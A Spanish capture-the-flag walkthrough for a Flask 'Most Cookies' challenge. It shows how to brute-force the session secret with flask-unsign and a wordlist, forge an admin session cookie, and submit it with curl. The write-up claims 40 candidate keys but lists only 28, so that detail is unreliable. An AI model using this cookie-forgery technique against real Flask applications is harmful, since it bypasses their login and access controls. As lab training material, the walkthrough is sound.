## Most Cookies

### Descripción
Alright, enough of using my own encryption. Flask session cookies should be plenty secure!

Additional details will be available after launching your challenge instance.
### Solución

#### Solución 1
Para resolver el problema, busqué la solución en youtube, y con ayuda de una herramienta de IA, hice un mejor acercamiento para resolver el problema. A continuación dejo los pasos que me puso la IA:
## Paso 1: Analizar el código fuente

El servidor Flask:

- Tiene una lista de 40 nombres de cookies que usa como posibles secret keys
    
- Selecciona aleatoriamente uno como `app.secret_key`
    
- La cookie de sesión contiene `very_auth` que puede ser "blank", un nombre de cookie, o "admin"
    
- Para obtener la flag, `very_auth` debe ser exactamente "admin"
    

## Paso 2: Obtener una cookie válida

Primero, necesitas una cookie del sitio web. Puedes obtenerla:

1. Accede a la página web del desafío
    
2. En el campo de búsqueda, ingresa cualquier nombre de cookie de la lista (ej: "snickerdoodle")
    
3. Inspecciona las cookies del navegador o usa herramientas de desarrollo para copiar la cookie de sesión
    

La cookie tendrá un formato similar a: `eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.aIGZmQ.mNrs9hRTcfj4dt0NLK0Os_Auppo`

## Paso 3: Preparar los archivos necesarios

Crea un archivo con la lista de posibles secret keys:

bash

cat > secrets.txt << 'EOF'
snickerdoodle
chocolate chip
oatmeal raisin
gingersnap
shortbread
peanut butter
whoopie pie
sugar
molasses
kiss
biscotti
butter
spritz
snowball
drop
thumbprint
pinwheel
wafer
macaroon
fortune
crinkle
icebox
gingerbread
tassie
lebkuchen
macaron
black and white
white chocolate macadamia
EOF

## Paso 4: Guardar la cookie en un archivo

Copia tu cookie y guárdala en un archivo:

bash

echo -n "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.aIGZmQ.mNrs9hRTcfj4dt0NLK0Os_Auppo" > cookie.txt

## Paso 5: Instalar flask-unsign (si no lo tienes)

bash

pip install flask-unsign

## Paso 6: Descifrar el secret key

Usa flask-unsign con el wordlist para encontrar el secret key:

bash

flask-unsign --wordlist secrets.txt --unsign --cookie < cookie.txt

Este comando te mostrará el secret key utilizado (en el ejemplo del mensaje era "fortune").

## Paso 7: Crear una nueva cookie con valor "admin"

Una vez que tengas el secret key, crea una nueva cookie con el payload modificado:

bash

flask-unsign --sign --secret "fortune" --cookie "{'very_auth':'admin'}"

(Reemplaza "fortune" con el secret key que encontraste)

Esto generará una nueva cookie como: `eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-tiUA.Mc2lQdEwbWt5xTLQv3tJvq5zlnE`

## Paso 8: Usar la nueva cookie

Hay dos formas de usar la cookie:

**Opción A - Usando curl:**

bash

curl -v --cookie "session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-tiUA.Mc2lQdEwbWt5xTLQv3tJvq5zlnE" http://[URL-del-desafío]/display

**Opción B - Manualmente en el navegador:**

1. Abre las herramientas de desarrollo (F12)
    
2. Ve a la pestaña "Application" o "Almacenamiento"
    
3. Busca las cookies y reemplaza el valor de "session" con tu nueva cookie
    
4. Recarga la página en `/display`
    

## Paso 9: Obtener la flag

Cuando accedas a `/display` con la cookie modificada donde `very_auth` es "admin", el servidor te mostrará la flag.

## Resumen de comandos:

bash

# 1. Crear wordlist
cat > secrets.txt [pegar la lista]
# 2. Guardar cookie
echo -n "tu-cookie-aqui" > cookie.txt
# 3. Encontrar secret key
flask-unsign --wordlist secrets.txt --unsign --cookie < cookie.txt
# 4. Crear cookie admin
flask-unsign --sign --secret "secret-encontrado" --cookie "{'very_auth':'admin'}"
# 5. Enviar cookie
curl --cookie "session=cookie-generada" http://[URL]/display
### Notas adicionales

### Referencias

-